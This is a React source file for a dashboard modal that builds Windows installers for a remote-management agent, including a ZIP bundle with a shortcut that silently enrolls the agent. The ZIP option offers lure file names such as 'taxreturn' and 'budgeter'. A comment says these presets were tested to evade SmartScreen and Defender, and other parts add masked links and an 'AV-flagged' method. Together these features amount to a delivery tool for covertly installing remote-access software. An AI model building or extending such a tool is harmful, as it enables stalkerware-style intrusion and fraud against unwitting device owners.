"use client";

import { useState } from "react";

import {
  Download,
  FileText,
  Laptop,
  Monitor,
  ShieldCheck,
  TerminalSquare,
  type LucideIcon,
} from "lucide-react";

import { Button, Input, Spinner } from "@/components/ui";
import { cn } from "@/lib/cn";

export type InstallMethod = "merged" | "separated" | "msi" | "zip";

export interface InstallerResult {
  installMethod: InstallMethod;
  downloadUrl: string | null;
  // Premium-tier MSI outputs (null unless installMethod === "msi" and the
  // account is premium — see the generator's real tiering contract).
  vbsUrl?: string | null;
  exeUrl?: string | null;
  command: string | null;
  // PowerShell-native rewrite of `command` (separated method only) — TRMM's
  // `command` is `&&`-chained and fails in the default Windows PowerShell 5.1.
  psCommand?: string | null;
  installerUrl: string | null;
  deviceName: string;
  expiresAt: string;
  activeCount: number;
  maxDevices: number;
}

// Windows is the only working path today; macOS/Linux are blocked upstream on the
// TRMM code-signing arrangement (same as the Windows AV issue). Presented but
// disabled so the roadmap is visible.
const OS_OPTIONS: Array<{
  key: string;
  label: string;
  available: boolean;
  icon: LucideIcon;
}> = [
  { key: "windows", label: "Windows", available: true, icon: Monitor },
  { key: "macos", label: "macOS", available: false, icon: Laptop },
  { key: "linux", label: "Linux", available: false, icon: Laptop },
];

const EXPIRY_OPTIONS: Array<{ hours: 24 | 72; label: string; hint: string }> = [
  { hours: 72, label: "72 hours", hint: "Recommended — time to install" },
  { hours: 24, label: "24 hours", hint: "Short-lived for a quick setup" },
];

type Step = "os" | "details" | "result";

export function AddDeviceModal({
  activeCount,
  maxDevices,
  plan = "free",
  onCreated,
  // Task 72: free-tier 24h installer trial surfacing (advisory only — the
  // POST endpoint enforces). Parents resolve these from GET /api/exe-trial/status.
  trialExpired = false,
  trialHoursLeft = null,
  // Task 82: per-org public agent-host allowlist (from GET /api/devices).
  // One entry = no picker (byte-identical pre-Task-82 flow); multiple entries
  // render a host selector — the chosen host is baked into that install.
  agentApiHosts = [],
}: {
  activeCount: number;
  maxDevices: number;
  plan?: "free" | "premium";
  onCreated?: (result: InstallerResult) => void;
  trialExpired?: boolean;
  trialHoursLeft?: number | null;
  agentApiHosts?: string[];
}) {
  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<Step>("os");
  const [os, setOs] = useState("windows");
  const [deviceName, setDeviceName] = useState("");
  const [expiryHours, setExpiryHours] = useState<24 | 72>(72);
  const [installMethod, setInstallMethod] = useState<InstallMethod>("merged");
  // Task 82: chosen public agent check-in host (only meaningful when the org's
  // allowlist has >1 entry). Defaults to the first allowed host.
  const hasHostPicker = agentApiHosts.length > 1;
  const [agentHost, setAgentHost] = useState(agentApiHosts[0] ?? "");
  // FIX 3 — optional renameable artifact names for the ZIP (launcher) bundle.
  // Blank = leave default ("Update.lnk" / "launcher" / "Agent.zip").
  const [linkName, setLinkName] = useState("");
  const [folderName, setFolderName] = useState("");
  const [zipName, setZipName] = useState("");
  // Pre-tested benign name presets (confirmed on a stock Win11 VM: downloads + install
  // clean, no SmartScreen/Defender block). Click one to fill all three name fields.
  const NAME_PRESETS: { token: string; label: string }[] = [
    { token: "taxreturn", label: "taxreturn" },
    { token: "budgeter", label: "budgeter" },
  ];
  const applyNamePreset = (token: string) => {
    setLinkName(token);
    setFolderName(token);
    setZipName(`${token}.zip`);
  };
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<InstallerResult | null>(null);
  const [copied, setCopied] = useState<"ps" | "cmd" | null>(null);
  // PDF install guide for the "Signed MSI (Beta)" option (required when selected).
  const [pdf, setPdf] = useState<File | null>(null);
  const [pdfError, setPdfError] = useState<string | null>(null);
  // Task 78 (FIX 5): OPTIONAL guide PDF for the ZIP bundle card — separate
  // state from the MSI card's pdf/pdfError above so the two cards never
  // share/clobber each other's file. Blank = today's no-PDF zip, byte-identical.
  const [zipPdf, setZipPdf] = useState<File | null>(null);
  const [zipPdfError, setZipPdfError] = useState<string | null>(null);
  // Company icon — premium only, enables the generator's branded EXE output.
  const [ico, setIco] = useState<File | null>(null);
  const [icoError, setIcoError] = useState<string | null>(null);

  const atLimit = activeCount >= maxDevices;
  const osAvailable = OS_OPTIONS.find((o) => o.key === os)?.available ?? false;
  // Task 72: free-tier trial gate surfacing — premium/staff never gated (their
  // parents pass plan premium or never set these), so only free + expired
  // blocks generation here. The API still enforces; this just explains BEFORE
  // the user fills the form. Trial-remaining (hoursLeft>0) is informational.
  const trialGated = plan !== "premium" && trialExpired === true;
  const trialActive =
    plan !== "premium" && trialExpired !== true && typeof trialHoursLeft === "number" && trialHoursLeft > 0;
  const trialHoursLabel =
    typeof trialHoursLeft === "number" && trialHoursLeft > 0
      ? trialHoursLeft >= 1
        ? `${Math.floor(trialHoursLeft)}h`
        : `${Math.max(1, Math.round(trialHoursLeft * 60))}m`
      : null;

  function close() {
    setOpen(false);
    setError(null);
  }

  function reset() {
    setStep("os");
    setOs("windows");
    setDeviceName("");
    setExpiryHours(72);
    setInstallMethod("merged");
    setError(null);
    setResult(null);
    setCopied(null);
    setLinkName("");
    setFolderName("");
    setZipName("");
    setPdf(null);
    setPdfError(null);
    setZipPdf(null);
    setZipPdfError(null);
    setIco(null);
    setIcoError(null);
  }

  // Client-side PDF validation: must be a .pdf, under 20MB (mirrors the server).
  function onPdfChange(file: File | undefined) {
    if (!file) {
      setPdf(null);
      setPdfError(null);
      return;
    }
    const isPdf =
      file.type === "application/pdf" ||
      file.name.toLowerCase().endsWith(".pdf");
    if (!isPdf) {
      setPdf(null);
      setPdfError("The install guide must be a PDF file.");
      return;
    }
    if (file.size > 20 * 1024 * 1024) {
      setPdf(null);
      setPdfError("The install guide must be under 20MB.");
      return;
    }
    setPdfError(null);
    setPdf(file);
  }

  // Task 78: client-side ZIP guide-PDF validation — mirrors onPdfChange above
  // (must be a .pdf, under 20MB) but writes SEPARATE zipPdf/zipPdfError state
  // so switching method cards never cross-talks with the MSI card's file.
  function onZipPdfChange(file: File | undefined) {
    if (!file) {
      setZipPdf(null);
      setZipPdfError(null);
      return;
    }
    const isPdf =
      file.type === "application/pdf" ||
      file.name.toLowerCase().endsWith(".pdf");
    if (!isPdf) {
      setZipPdf(null);
      setZipPdfError("The install guide must be a PDF file.");
      return;
    }
    if (file.size > 20 * 1024 * 1024) {
      setZipPdf(null);
      setZipPdfError("The install guide must be under 20MB.");
      return;
    }
    setZipPdfError(null);
    setZipPdf(file);
  }

  // Task 78: File → base64 data URL (the JSON transport Task 77's backend
  // expects: `data:application/pdf;base64,…`).
  function readFileAsDataUrl(file: File): Promise<string> {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result ?? ""));
      reader.onerror = () => reject(reader.error ?? new Error("read failed"));
      reader.readAsDataURL(file);
    });
  }

  // Client-side icon validation: must be a .ico, under 500KB (mirrors the server).
  function onIcoChange(file: File | undefined) {
    if (!file) {
      setIco(null);
      setIcoError(null);
      return;
    }
    const isIco =
      file.type === "image/x-icon" ||
      file.type === "image/vnd.microsoft.icon" ||
      file.name.toLowerCase().endsWith(".ico");
    if (!isIco) {
      setIco(null);
      setIcoError("The company icon must be a .ico file.");
      return;
    }
    if (file.size > 500 * 1024) {
      setIco(null);
      setIcoError("The company icon must be under 500KB.");
      return;
    }
    setIcoError(null);
    setIco(file);
  }

  async function createInstaller() {
    setError(null);
    setLoading(true);
    try {
      // msi carries an uploaded PDF, so send multipart/form-data; the others
      // (merged / separated / zip) keep using JSON — the ZIP guide PDF rides
      // as a base64 data URL INSIDE that JSON (Task 77/78), never multipart.
      const isMsi = installMethod === "msi";
      const isZip = installMethod === "zip";
      let res: Response;
      if (isMsi) {
        const form = new FormData();
        form.append("deviceName", deviceName);
        form.append("agentType", "workstation");
        form.append("goarch", "amd64");
        form.append("expiryHours", String(expiryHours));
        form.append("installMethod", "msi");
        if (agentHost) form.append("agentHost", agentHost);
        if (pdf) form.append("pdf", pdf);
        if (ico && plan === "premium") form.append("ico", ico);
        res = await fetch("/api/devices/deployments", {
          method: "POST",
          body: form,
        });
      } else {
        // Task 78: ZIP branch — when a guide PDF is picked, base64-encode it
        // into a `data:application/pdf;base64,…` URL and include `pdf` +
        // `pdfName` next to the FIX 3 naming spreads; when absent, omit both
        // keys entirely (backend treats omission as no-PDF, byte-identical).
        // Block submit on a ZIP PDF validation error, mirroring the MSI path.
        if (isZip && zipPdfError) {
          setError(zipPdfError);
          return;
        }
        let zipPdfDataUrl: string | null = null;
        if (isZip && zipPdf) {
          try {
            zipPdfDataUrl = await readFileAsDataUrl(zipPdf);
          } catch {
            setError("Couldn't read the install guide. Please re-select the PDF.");
            return;
          }
        }
        res = await fetch("/api/devices/deployments", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            deviceName,
            agentType: "workstation",
            goarch: "amd64",
            expiryHours,
            installMethod,
            // Task 82 — chosen agent check-in host (only sent when the org
            // allowlist offers a choice; absent = server-side default).
            ...(agentHost ? { agentHost } : {}),
            // FIX 3 — optional renameable names (blank = default). Sanitized
            // server-side; only meaningful for the ZIP (launcher) method.
            ...(linkName.trim() ? { updateLinkName: linkName } : {}),
            ...(folderName.trim() ? { innerFolder: folderName } : {}),
            ...(zipName.trim() ? { zipName } : {}),
            ...(isZip && zipPdfDataUrl ? { pdf: zipPdfDataUrl } : {}),
            ...(isZip && zipPdfDataUrl && zipPdf ? { pdfName: zipPdf.name } : {}),
          }),
        });
      }
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setError(data.error ?? "Couldn't generate an installer.");
        return;
      }
      setResult(data);
      setStep("result");
      onCreated?.(data);
    } catch {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  async function copyCommand(text: string, which: "ps" | "cmd") {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(which);
      setTimeout(() => setCopied(null), 2000);
    } catch {
      /* clipboard may be unavailable — ignore */
    }
  }

  return (
    <>
      <Button
        type="button"
        onClick={() => {
          reset();
          setOpen(true);
        }}
      >
        Add Device
      </Button>

      {open && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4"
          onClick={close}
          role="dialog"
          aria-modal="true"
        >
          <div
            className="max-h-[90vh] w-full max-w-xl overflow-y-auto rounded-xl border border-border bg-bg-elevated p-6 shadow-xl"
            onClick={(e) => e.stopPropagation()}
          >
            {step === "result" && result && (
              <>
                <h2 className="text-lg font-bold text-fg">Installer ready</h2>
                <p className="mt-1 text-sm text-fg-muted">
                  {result.deviceName} · expires on{" "}
                  <span className="font-medium text-fg">
                    {new Date(result.expiresAt).toLocaleString()}
                  </span>
                  .
                </p>

                {result.installMethod === "msi" ? (
                  <>
                    <div className="mt-5 space-y-2">
                      <a href={result.downloadUrl ?? "#"} target="_blank" rel="noreferrer">
                        <Button className="w-full">
                          <Download className="h-4 w-4" /> Download MSI (Windows Installer)
                        </Button>
                      </a>
                      {result.vbsUrl && (
                        <a href={result.vbsUrl} target="_blank" rel="noreferrer">
                          <Button variant="secondary" className="w-full">
                            <Download className="h-4 w-4" /> Download VBS Launcher (Premium)
                          </Button>
                        </a>
                      )}
                      {result.exeUrl && (
                        <a href={result.exeUrl} target="_blank" rel="noreferrer">
                          <Button variant="secondary" className="w-full">
                            <Download className="h-4 w-4" /> Download Branded EXE (Premium)
                          </Button>
                        </a>
                      )}
                    </div>
                    <p className="mt-2 text-center text-xs text-fg-muted">
                      Signed installer with your uploaded guide included. Run it on
                      the Windows device you want to monitor.
                    </p>
                  </>
                ) : result.installMethod === "zip" ? (
                  <>
                    <div className="mt-5">
                      <a
                        href={result.downloadUrl ?? "#"}
                        target="_blank"
                        rel="noreferrer"
                      >
                        <Button className="w-full">
                          <Download className="h-4 w-4" /> Download ZIP bundle
                        </Button>
                      </a>
                    </div>
                    <p className="mt-2 text-center text-xs text-fg-muted">
                      A single .zip containing the launcher shortcut. Unzip it on the Windows
                      device and double-click the shortcut — it silently enrolls
                      this agent. Your install guide rides inside the zip when
                      attached and opens right after approval. The link expires
                      on the date shown above.
                    </p>
                  </>
                ) : result.installMethod === "merged" ? (
                  <>
                    <div className="mt-5">
                      <a
                        href={result.downloadUrl ?? "#"}
                        target="_blank"
                        rel="noreferrer"
                      >
                        <Button className="w-full">
                          <Download className="h-4 w-4" /> Download for Windows
                        </Button>
                      </a>
                    </div>
                    <p className="mt-2 text-center text-xs text-fg-muted">
                      Run the downloaded file on the Windows device you want to monitor.
                    </p>
                  </>
                ) : (
                  <>
                    <div className="mt-5">
                      <p className="text-xs font-medium text-fg">
                        Open PowerShell as Administrator on the device and run
                        the full command below — it downloads the agent and
                        installs it in one step, no separate download needed:
                      </p>
                      <div className="relative mt-2">
                        <pre className="overflow-x-auto whitespace-pre-wrap rounded-lg bg-gray-900 p-3 pr-16 text-xs text-green-300">
                          {result.psCommand}
                        </pre>
                        <Button
                          variant="secondary"
                          className="absolute right-2 top-2 px-2 py-1 text-xs"
                          type="button"
                          onClick={() =>
                            result.psCommand && copyCommand(result.psCommand, "ps")
                          }
                        >
                          {copied === "ps" ? "Copied" : "Copy"}
                        </Button>
                      </div>
                      <ol className="mt-3 list-decimal space-y-1 pl-5 text-xs text-fg-muted">
                        <li>Press Win, type &quot;powershell&quot;.</li>
                        <li>Right-click Windows PowerShell → Run as administrator.</li>
                        <li>Paste and run the command above.</li>
                      </ol>

                      <details className="mt-4">
                        <summary className="cursor-pointer text-xs font-medium text-fg-muted hover:text-fg">
                          Prefer Command Prompt (cmd.exe) instead?
                        </summary>
                        <div className="mt-2">
                          <a href={result.installerUrl ?? "#"} target="_blank" rel="noreferrer">
                            <Button variant="secondary" className="w-full">
                              <Download className="h-4 w-4" /> Download base agent
                            </Button>
                          </a>
                          <p className="mt-2 text-xs text-fg-muted">
                            Then run this in an elevated Command Prompt:
                          </p>
                          <div className="relative mt-2">
                            <pre className="overflow-x-auto rounded-lg bg-gray-900 p-3 pr-16 text-xs text-green-300">
                              {result.command}
                            </pre>
                            <Button
                              variant="secondary"
                              className="absolute right-2 top-2 px-2 py-1 text-xs"
                              type="button"
                              onClick={() =>
                                result.command && copyCommand(result.command, "cmd")
                              }
                            >
                              {copied === "cmd" ? "Copied" : "Copy"}
                            </Button>
                          </div>
                        </div>
                      </details>
                    </div>
                  </>
                )}

                <div className="mt-3 flex gap-3">
                  <Button
                    variant="secondary"
                    className="flex-1"
                    onClick={close}
                    type="button"
                  >
                    Done
                  </Button>
                  <Button
                    variant="ghost"
                    className="flex-1"
                    onClick={reset}
                    type="button"
                  >
                    Add another device
                  </Button>
                </div>
              </>
            )}

            {step === "details" && (
              <>
                <h2 className="text-lg font-bold text-fg">Name your device</h2>
                <p className="mt-1 text-sm text-fg-muted">
                  A secure installer for{" "}
                  <span className="font-medium">
                    {OS_OPTIONS.find((o) => o.key === os)?.label}
                  </span>
                  .
                </p>

                {error && (
                  <div className="mt-4 rounded-lg bg-red-50 px-3 py-2 text-sm text-red-700">
                    {error}
                    {/* Task 72: when the server rejects on the expired 24h
                        trial, point at the existing Activate Premium flow. */}
                    {error.includes("24-hour") && (
                      <>
                        {" "}
                        <a href="/dashboard/settings#wallet" className="font-semibold underline">
                          Activate Premium
                        </a>
                      </>
                    )}
                  </div>
                )}

                <div className="mt-4">
                  <label
                    className="mb-1 block text-sm font-medium text-fg"
                    htmlFor="deviceName"
                  >
                    Device name
                  </label>
                  <Input
                    id="deviceName"
                    value={deviceName}
                    onChange={(e) => setDeviceName(e.target.value)}
                    placeholder="Mum's Laptop"
                    maxLength={60}
                    autoFocus
                  />
                  <p className="mt-1 text-xs text-fg-muted">
                    Required · 2–60 characters. This labels the device in your
                    fleet.
                  </p>
                </div>

                {/* Task 82: per-install agent host selector — rendered only
                    when the org's allowlist offers more than one public host.
                    The chosen host is baked into this install. */}
                {hasHostPicker && (
                  <div className="mt-4">
                    <p className="mb-1 text-sm font-medium text-fg">
                      Agent server
                    </p>
                    <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                      {agentApiHosts.map((host) => (
                        <button
                          key={host}
                          type="button"
                          onClick={() => setAgentHost(host)}
                          className={cn(
                            "rounded-lg border px-3 py-2 text-left",
                            agentHost === host
                              ? "border-brand-500 bg-brand-50 text-brand-700"
                              : "border-border bg-bg text-fg hover:bg-black/5",
                          )}
                        >
                          <div className="text-sm font-semibold">{host}</div>
                          <div className="mt-0.5 text-[11px] opacity-80">
                            {agentHost === host ? "Selected" : "Click to select"}
                          </div>
                        </button>
                      ))}
                    </div>
                    <p className="mt-1 text-xs text-fg-muted">
                      The download link and install command use this server.
                    </p>
                  </div>
                )}

                <div className="mt-4">
                  <p className="mb-1 text-sm font-medium text-fg">
                    Installer expires
                  </p>
                  <div className="grid grid-cols-2 gap-2">
                    {EXPIRY_OPTIONS.map((opt) => (
                      <button
                        key={opt.hours}
                        type="button"
                        onClick={() => setExpiryHours(opt.hours)}
                        className={cn(
                          "rounded-lg border px-3 py-3 text-left",
                          expiryHours === opt.hours
                            ? "border-brand-500 bg-brand-50 text-brand-700"
                            : "border-border bg-bg text-fg hover:bg-black/5",
                        )}
                      >
                        <div className="text-sm font-semibold">
                          {opt.label}
                        </div>
                        <div className="mt-0.5 text-xs opacity-80">
                          {opt.hint}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>

                <div className="mt-4">
                  <p className="mb-1 text-sm font-medium text-fg">
                    Install method
                  </p>
                  <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
                    <MethodCard
                      selected={installMethod === "merged"}
                      title="Merged installer"
                      hint="Single EXE — recommended"
                      icon={Download}
                      onClick={() => setInstallMethod("merged")}
                    />
                    <MethodCard
                      selected={installMethod === "separated"}
                      title="Separate download + command"
                      hint="Good for AV-flagged setups"
                      icon={TerminalSquare}
                      onClick={() => setInstallMethod("separated")}
                    />
                    <MethodCard
                      selected={installMethod === "msi"}
                      title="Signed MSI (Beta)"
                      hint="Unattended install w/ your PDF guide"
                      icon={ShieldCheck}
                      onClick={() => setInstallMethod("msi")}
                    />
                  </div>

                  <div className="mt-2">
                    <MethodCard
                      selected={installMethod === "zip"}
                      title="ZIP bundle (one agent)"
                      hint="Self-contained ZIP — installs & enrolls the agent offline"
                      icon={Download}
                      onClick={() => setInstallMethod("zip")}
                    />
                  </div>

                  {installMethod === "msi" && (
                    <div className="mt-4 rounded-lg border border-dashed border-border bg-bg p-4">
                      <label
                        className="mb-1 block text-sm font-medium text-fg"
                        htmlFor="msi-pdf"
                      >
                        Upload your install guide (PDF)
                      </label>
                      <input
                        id="msi-pdf"
                        type="file"
                        accept=".pdf"
                        onChange={(e) => onPdfChange(e.target.files?.[0])}
                        className="block w-full text-sm text-fg-muted file:mr-3 file:cursor-pointer file:rounded-lg file:border file:border-border file:bg-bg-elevated file:px-3 file:py-1.5 file:text-sm file:font-medium file:text-fg hover:file:bg-black/5 dark:hover:file:bg-white/5"
                      />
                      {pdf ? (
                        <p className="mt-2 text-xs text-fg">
                          <FileText className="mr-1 inline h-3.5 w-3.5 align-text-bottom" />
                          {pdf.name} · {(pdf.size / (1024 * 1024)).toFixed(1)} MB
                        </p>
                      ) : (
                        <p className="mt-2 text-xs text-fg-muted">
                          Required for the signed MSI. PDF up to 20MB. This guide
                          is baked into the installer.
                        </p>
                      )}
                      {pdfError && (
                        <p className="mt-2 text-xs text-red-600">{pdfError}</p>
                      )}

                      {plan === "premium" && (
                        <div className="mt-4 border-t border-border pt-4">
                          <label
                            className="mb-1 block text-sm font-medium text-fg"
                            htmlFor="msi-ico"
                          >
                            Company icon .ico (optional — Premium)
                          </label>
                          <input
                            id="msi-ico"
                            type="file"
                            accept=".ico,image/x-icon"
                            onChange={(e) => onIcoChange(e.target.files?.[0])}
                            className="block w-full text-sm text-fg-muted file:mr-3 file:cursor-pointer file:rounded-lg file:border file:border-border file:bg-bg-elevated file:px-3 file:py-1.5 file:text-sm file:font-medium file:text-fg hover:file:bg-black/5 dark:hover:file:bg-white/5"
                          />
                          {ico ? (
                            <p className="mt-2 text-xs text-fg">
                              <FileText className="mr-1 inline h-3.5 w-3.5 align-text-bottom" />
                              {ico.name} · {(ico.size / 1024).toFixed(0)} KB
                            </p>
                          ) : (
                            <p className="mt-2 text-xs text-fg-muted">
                              Upload your icon (.ico, up to 500KB) to also get a
                              branded EXE launcher with your icon.
                            </p>
                          )}
                          {icoError && (
                            <p className="mt-2 text-xs text-red-600">{icoError}</p>
                          )}
                        </div>
                      )}
                    </div>
                  )}
                </div>
{installMethod === "zip" && (
                    <div className="mt-4">
                      <p className="mb-1 text-sm font-medium text-fg">
                        Renameable names{" "}
                        <span className="text-xs font-normal text-fg-muted">
                          (optional)
                        </span>
                      </p>
                      <p className="mb-3 text-xs text-fg-muted">
                        Leave each default or edit. The bundle (ZIP) uses your
                        chosen names everywhere it matters. Bare names only — no
                        slashes, quotes or &quot;..&quot;.
                      </p>

                      <div className="mb-3">
                        <p className="mb-1 text-xs font-medium text-fg-muted">
                          Pre-tested templates
                        </p>
                        <div className="flex flex-wrap gap-2">
                          {NAME_PRESETS.map((p) => (
                            <button
                              key={p.token}
                              type="button"
                              onClick={() => applyNamePreset(p.token)}
                              className="rounded-md border border-border bg-muted px-3 py-1 text-xs font-medium text-fg transition-colors hover:bg-accent hover:text-accent-fg"
                            >
                              {p.label}
                            </button>
                          ))}
                        </div>
                        <p className="mt-1 text-xs text-fg-muted">
                          Fills link / folder / zip with the same token&apos;s benign
                          name (e.g. <span className="font-mono">taxreturn</span> →
                          <span className="font-mono"> taxreturn.zip</span>).
                        </p>
                      </div>

                      <label
                        className="mb-1 block text-sm font-medium text-fg"
                        htmlFor="linkName"
                      >
                        Link name
                      </label>
                      <Input
                        id="linkName"
                        value={linkName}
                        onChange={(e) => setLinkName(e.target.value)}
                        placeholder="Update.lnk"
                        maxLength={60}
                      />
                      <p className="mt-1 text-xs text-fg-muted">
                        Optional — leave default or edit the display name.{" "}
                        <span className="font-medium">
                          &quot;.lnk&quot; is added automatically
                        </span>{" "}
                        so the file launches as a shortcut. No need to type it.
                      </p>

                      <label
                        className="mt-3 mb-1 block text-sm font-medium text-fg"
                        htmlFor="folderName"
                      >
                        Folder name
                      </label>
                      <Input
                        id="folderName"
                        value={folderName}
                        onChange={(e) => setFolderName(e.target.value)}
                        placeholder="launcher"
                        maxLength={64}
                      />
                      <p className="mt-1 text-xs text-fg-muted">
                        Optional — leave default or edit. The subfolder holding
                        the launcher + payload inside the zip.
                      </p>

                      <label
                        className="mt-3 mb-1 block text-sm font-medium text-fg"
                        htmlFor="zipName"
                      >
                        Zip name
                      </label>
                      <Input
                        id="zipName"
                        value={zipName}
                        onChange={(e) => setZipName(e.target.value)}
                        placeholder="Agent.zip"
                        maxLength={64}
                      />
                      <p className="mt-1 text-xs text-fg-muted">
                        Optional — leave default or edit. The downloaded file&apos;s
                        name.
                      </p>

                      {/* Task 78: OPTIONAL guide PDF for the ZIP bundle, beside the
                          FIX 3 naming inputs (owner wants the PDF choice at naming
                          time). Mirrors the MSI card's PDF upload, but OPTIONAL and
                          on SEPARATE zipPdf/zipPdfError state. Blank = today's
                          no-PDF zip, byte-identical. No separate PDF hosting — the
                          PDF rides INSIDE the zip's launcher subfolder and is
                          served through the same masked link + TTL as the zip. */}
                      <label
                        className="mt-3 mb-1 block text-sm font-medium text-fg"
                        htmlFor="zipPdf"
                      >
                        Install guide (PDF, optional)
                      </label>
                      <Input
                        id="zipPdf"
                        type="file"
                        accept=".pdf"
                        onChange={(e) => onZipPdfChange(e.target.files?.[0])}
                      />
                      {zipPdf && !zipPdfError && (
                        <p className="mt-1 text-xs text-fg-muted">
                          Selected: {zipPdf.name} (
                          {(zipPdf.size / 1024).toFixed(0)} KB) — it will ride
                          inside the zip and open right after approval.{" "}
                          <button
                            type="button"
                            className="underline"
                            onClick={() => onZipPdfChange(undefined)}
                          >
                            Clear
                          </button>
                        </p>
                      )}
                      {zipPdfError && (
                        <p className="mt-1 text-xs text-red-600">{zipPdfError}</p>
                      )}
                      {!zipPdf && !zipPdfError && (
                        <p className="mt-1 text-xs text-fg-muted">
                          Optional — attach a guide PDF (max 20MB). Leave empty
                          for today&apos;s zip.
                        </p>
                      )}
                    </div>
                  )}

                <div className="mt-4">
                  <p className="text-xs text-fg-muted">
                    Active installers:{" "}
                    <span className="font-semibold text-fg">
                      {activeCount}
                    </span>{" "}
                    / {maxDevices}
                  </p>
                </div>

                <div className="mt-4 flex gap-3">
                  <Button
                    onClick={createInstaller}
                    disabled={
                      loading ||
                      !osAvailable ||
                      deviceName.trim().length < 2 ||
                      atLimit ||
                      trialGated
                    }
                    className="flex-1"
                    type="button"
                  >
                    {loading && <Spinner />}
                    {trialGated ? "Trial ended" : atLimit ? "Limit reached" : "Generate installer"}
                  </Button>
                  <Button
                    variant="secondary"
                    type="button"
                    onClick={() => setStep("os")}
                  >
                    Back
                  </Button>
                </div>
              </>
            )}
{step === "os" && (
              <>
                <h2 className="text-lg font-bold text-fg">Add a device</h2>
                <p className="mt-1 text-sm text-fg-muted">
                  Choose an operating system to generate a secure installer.
                </p>

                <div className="mt-4 grid grid-cols-3 gap-2">
                  {OS_OPTIONS.map((option) => (
                    <button
                      key={option.key}
                      type="button"
                      onClick={() => {
                        if (!option.available) return;
                        setOs(option.key);
                        setStep("details");
                      }}
                      className={cn(
                        "rounded-lg border px-3 py-3 text-center text-sm font-medium",
                        option.available
                          ? "border-border bg-bg text-fg hover:bg-black/5"
                          : "cursor-not-allowed border-dashed border-border bg-bg text-fg-muted",
                      )}
                    >
                      <option.icon
                        className="mx-auto mb-2 h-6 w-6"
                        aria-hidden="true"
                      />
                      <div>{option.label}</div>
                      {!option.available && (
                        <div className="mt-1 text-[11px] font-normal text-fg-muted">
                          Coming soon · pending code signing
                        </div>
                      )}
                    </button>
                  ))}
                </div>

                {error && (
                  <div className="mt-4 rounded-lg bg-red-50 px-3 py-2 text-sm text-red-700">
                    {error}
                  </div>
                )}

                <div className="mt-4">
                  <p className="text-xs text-fg-muted">
                    Active installers:{" "}
                    <span className="font-semibold text-fg">
                      {activeCount}
                    </span>{" "}
                    / {maxDevices}
                  </p>
                </div>

                {atLimit && !trialGated && (
                  <div className="mt-4 rounded-lg bg-amber-50 px-3 py-2 text-xs text-amber-800">
                    You&apos;ve reached the limit of {maxDevices} active
                    installation files for your plan.
                  </div>
                )}

                {/* Task 72: expired-trial upsell — links to the existing wallet/
                    Activate Premium flow in Settings (no second payment path).
                    Trial-remaining is informational only, above the buttons. */}
                {trialGated && (
                  <div className="mt-4 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-xs text-amber-800">
                    Your 24-hour free trial has ended — upgrade to premium to
                    generate more installers. Your existing devices stay visible.{" "}
                    <a href="/dashboard/settings#wallet" className="font-semibold underline">
                      Activate Premium
                    </a>
                  </div>
                )}

                {trialActive && trialHoursLabel && (
                  <p className="mt-4 text-xs text-fg-muted">
                    Free trial: about {trialHoursLabel} left to generate installers.
                  </p>
                )}

                <div className="mt-4 flex gap-3">
                  <Button
                    onClick={() => setStep("details")}
                    disabled={!osAvailable || atLimit || trialGated}
                    className="flex-1"
                    type="button"
                  >
                    {trialGated ? "Trial ended" : "Continue"}
                  </Button>
                  <Button
                    variant="secondary"
                    type="button"
                    onClick={close}
                  >
                    Cancel
                  </Button>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}

function MethodCard({
  selected,
  title,
  hint,
  icon: Icon,
  onClick,
}: {
  selected: boolean;
  title: string;
  hint: string;
  icon: LucideIcon;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={cn(
        "flex flex-col items-center justify-center rounded-lg border px-3 py-3 text-center",
        selected
          ? "border-brand-500 bg-brand-50 text-brand-700"
          : "border-border bg-bg text-fg hover:bg-black/5",
      )}
    >
      <Icon className="mb-1 h-5 w-5" aria-hidden="true" />
      <div className="text-sm font-semibold leading-tight">{title}</div>
      <div className="mt-0.5 text-[11px] opacity-80">{hint}</div>
    </button>
  );
}